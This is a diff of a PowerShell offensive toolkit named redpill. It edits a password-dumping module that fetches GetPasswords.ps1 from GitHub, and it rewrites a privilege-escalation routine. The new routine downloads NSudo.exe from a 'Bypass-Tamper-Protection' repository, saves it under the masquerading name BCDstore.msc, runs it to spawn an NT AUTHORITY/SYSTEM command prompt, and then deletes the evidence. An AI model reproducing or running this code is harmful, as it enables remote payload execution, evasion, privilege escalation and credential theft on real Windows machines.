@@ -1194,7 +1194,7 @@ If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetPasswords.ps1 -Destination $Env:TMP\GetPasswords.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetPasswords.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 16){## Corrupted download detected => DefaultFileSize: 16,4755859375/KB
+      If($SizeDump -lt 16){## Corrupted download detected => DefaultFileSize: 16,3642578125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetPasswords.ps1"){Remove-Item -Path "$Env:TMP\GetPasswords.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -1861,9 +1861,6 @@ If($PEHollow -ne "false"){
       on disk with explorer as the parent. Credits: @FuzzySecurity
       OR spawns an cmd.exe elevated prompt { NT AUTHORITY/SYSTEM }
 
-   .NOTES
-      Supported Platforms: Windows
-
    .Parameter PEHollow
       Accepts arguments: GetSystem OR the Payload.exe absoluct \ relative path
 
@@ -1949,15 +1946,23 @@ If($PEHollow -ne "false"){
       $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
       If($IsClientAdmin){
 
-         If(-not(Test-Path -Path "$Env:TMP\GetSystem.msc" -EA SilentlyContinue)){
-            Write-Host "`n`nDownloading GetSystem.msc from GitHub to %tmp%!" -ForegroundColor Green
-            iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/GetSystem.exe -OutFile $Env:TMP\GetSystem.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
+         ## Download and masquerade the required standalone executables
+         If(-not(Test-Path -Path "$Env:TMP\BCDstore.msc" -EA SilentlyContinue)){
+            iwr -Uri https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -OutFile $Env:TMP\BCDstore.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
          }
 
-         ## Execute Binary to elevate cmd.exe to NT AUTHORITY/SYSTEM
-         Write-Host "Executing GetSystem.msc to spawn NT AUTHORITY/SYSTEM prompt!`n`n" -ForegroundColor Green
-         cd $Env:TMP;.\GetSystem.msc $Env:WINDIR\System32\cmd.exe lsass
-         cd $Working_Directory ## Return to redpill working directory
+         If(-not(Test-Path -Path "$Env:TMP\BCDstore.msc" -EA SilentlyContinue)){
+
+            Write-Host "[error] fail to download: $Env:TMP\BCDstore.msc!`n`n" -ForegroundColor Red -BackgroundColor Black
+            exit ## Exit @redpill
+
+         }Else{
+
+            ## Execute Binary to elevate cmd.exe to NT AUTHORITY/SYSTEM
+            cd $Env:TMP;.\BCDstore.msc -U:T -P:E cmd
+            cd $Working_Directory ## Return to redpill working directory
+
+         }
 
       }Else{
 
@@ -1975,7 +1980,7 @@ If($PEHollow -ne "false"){
    }
 
    ## Clean Old files left behind
-   If(Test-Path -Path "$Env:TMP\GetSystem.msc"){Remove-Item -Path "$Env:TMP\GetSystem.msc" -Force}
+   If(Test-Path -Path "$Env:TMP\BCDstore.msc"){Remove-Item -Path "$Env:TMP\BCDstore.msc" -Force}
    If(Test-Path -Path "$Env:TMP\Start-Hollow.ps1"){Remove-Item -Path "$Env:TMP\Start-Hollow.ps1" -Force}
 }
 
@@ -3499,9 +3504,6 @@ $HelpParameters = @"
       This Module uses PowerShell to create a Hollow from a PE
       on disk with explorer as the parent. Credits: @FuzzySecurity
       OR spawns an cmd.exe elevated prompt { NT AUTHORITY/SYSTEM }
-
-   .NOTES
-      Supported Platforms: Windows
 
    .Parameter PEHollow
       Accepts arguments: GetSystem OR the Payload.exe absoluct \ relative path
